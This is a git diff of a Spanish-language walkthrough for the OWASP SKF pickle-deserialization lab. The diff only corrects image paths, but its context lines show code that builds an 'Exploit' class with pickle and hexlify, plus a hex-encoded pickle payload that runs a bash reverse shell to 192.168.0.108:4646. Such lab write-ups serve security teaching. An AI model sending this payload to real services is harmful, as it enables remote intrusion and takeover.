@@ -26,7 +26,7 @@ docker run -dit -p 127.0.0.1:5000:5000 blabla1337/owasp-skf-lab:des-pickle
 
 # ¿Qué es pickle?
 
-![Untitled](../assets/OWASP-TOP-10/Python – DES-Pickle AttackUntitled 1.png)
+![Untitled](../assets/OWASP-TOP-10/Python – DES-Pickle Attack/Untitled 1.png)
 
 *«Pickling»* es el proceso mediante el cual una jerarquía de objetos de Python se convierte en una secuencia de bytes, y el *«unpickling»* es la operación inversa, mediante la cual una secuencia de bytes de un archivo binario ([binary file](https://docs.python.org/es/3/glossary.html#term-binary-file)) o un objeto tipo binario ([bytes-like object](https://docs.python.org/es/3/glossary.html#term-bytes-like-object)) es convertido nuevamente en una jerarquía de objetos.
 
@@ -69,9 +69,9 @@ Ejemplo:
     ```
     
 
-![Untitled](../assets/OWASP-TOP-10/Python – DES-Pickle AttackUntitled 2.png)
+![Untitled](../assets/OWASP-TOP-10/Python – DES-Pickle Attack/Untitled 2.png)
 
-![Untitled](../assets/OWASP-TOP-10/Python – DES-Pickle AttackUntitled 3.png)
+![Untitled](../assets/OWASP-TOP-10/Python – DES-Pickle Attack/Untitled 3.png)
 
 ### pickle.dumps()
 
@@ -86,7 +86,7 @@ buffer_callback=None)
 
 Ejemplo:
 
-![Untitled](../assets/OWASP-TOP-10/Python – DES-Pickle AttackUntitled 4.png)
+![Untitled](../assets/OWASP-TOP-10/Python – DES-Pickle Attack/Untitled 4.png)
 
 ### pickle.load()
 
@@ -112,25 +112,25 @@ Ejemplo
     ```
     
 
-![Untitled](../assets/OWASP-TOP-10/Python – DES-Pickle AttackUntitled 5.png)
+![Untitled](../assets/OWASP-TOP-10/Python – DES-Pickle Attack/Untitled 5.png)
 
-![Untitled](../assets/OWASP-TOP-10/Python – DES-Pickle AttackUntitled 6.png)
+![Untitled](../assets/OWASP-TOP-10/Python – DES-Pickle Attack/Untitled 6.png)
 
 ### pickle.loads()
 
 **`pickle.loads()`**: Se usa para leer **objetos** serializados o “pickled” y mostrarlos en su forma deserializada.
 
-![Untitled](../assets/OWASP-TOP-10/Python – DES-Pickle AttackUntitled 7.png)
+![Untitled](../assets/OWASP-TOP-10/Python – DES-Pickle Attack/Untitled 7.png)
 
 # Análisis de código
 
 Ahora se analizará el archivo “DES-Pickle”:
 
-![Untitled](../assets/OWASP-TOP-10/Python – DES-Pickle AttackUntitled 8.png)
+![Untitled](../assets/OWASP-TOP-10/Python – DES-Pickle Attack/Untitled 8.png)
 
 Por el método POST, se están tramitando datos en la ruta “/sync”.
 
-![Untitled](../assets/OWASP-TOP-10/Python – DES-Pickle AttackUntitled 9.png)
+![Untitled](../assets/OWASP-TOP-10/Python – DES-Pickle Attack/Untitled 9.png)
 
 En la primer parte se está abriendo el archivo “pickle.hacker” con permisos de escritura. Se está tomando el valor que ingresó el usuario en el parámetro “data_obj” y lo almacena en la variable “att”, luego toma ese “att” el cual debe ser una cadena hexadecimal ya que se la función “bytes.fromhex” está buscando una cadena hexadecimal para convertirla en bytes y almacenar el output en la variable “attack”.
 
@@ -155,7 +155,7 @@ if __name__ == '__main__'
 	print(pickle.dumps(Exploit()))
 ```
 
-![Untitled](../assets/OWASP-TOP-10/Python – DES-Pickle AttackUntitled 10.png)
+![Untitled](../assets/OWASP-TOP-10/Python – DES-Pickle Attack/Untitled 10.png)
 
 Al ejecutar este código, el resultado será la representación de la clase “Exploit()” serializada en bytes pero en este caso, como se vio anteriormente, la página web solo acepta cadenas hexadecimales y para esto es que se usa la librería “binascii”, para representar una cadena en hexadecimal:
 
@@ -172,11 +172,11 @@ if __name__ == '__main__'
 	print(binascii.hexlify(pickle.dumps(Exploit())))
 ```
 
-![Untitled](../assets/OWASP-TOP-10/Python – DES-Pickle AttackUntitled 11.png)
+![Untitled](../assets/OWASP-TOP-10/Python – DES-Pickle Attack/Untitled 11.png)
 
 Al enviar esta cadena en hexadecimal al servidor, este un 0 pero no muestra el resultado del comando por lo que es posible que lo que está mostrando es el código de estado del comando ejecutado. En este caso, en lugar del comando “id”, se creará una reverse shell en la máquina local.
 
-![Untitled](../assets/OWASP-TOP-10/Python – DES-Pickle AttackUntitled 12.png)
+![Untitled](../assets/OWASP-TOP-10/Python – DES-Pickle Attack/Untitled 12.png)
 
 Código para reverse shell
 
@@ -193,7 +193,7 @@ if __name__ == '__main__':
 	print(binascii.hexlify(pickle.dumps(Exploit)))
 ```
 
-![Untitled](../assets/OWASP-TOP-10/Python – DES-Pickle AttackUntitled 13.png)
+![Untitled](../assets/OWASP-TOP-10/Python – DES-Pickle Attack/Untitled 13.png)
 
 Cadena copiada:
 
@@ -201,4 +201,4 @@ Cadena copiada:
 80049550000000000000008c05706f736978948c0673797374656d9493948c3562617368202d63202262617368202d69203e26202f6465762f7463702f3139322e3136382e302e3130382f3436343620303e26312294859452942e
 ```
 
-![Untitled](../assets/OWASP-TOP-10/Python – DES-Pickle AttackUntitled 14.png)
+![Untitled](../assets/OWASP-TOP-10/Python – DES-Pickle Attack/Untitled 14.png)
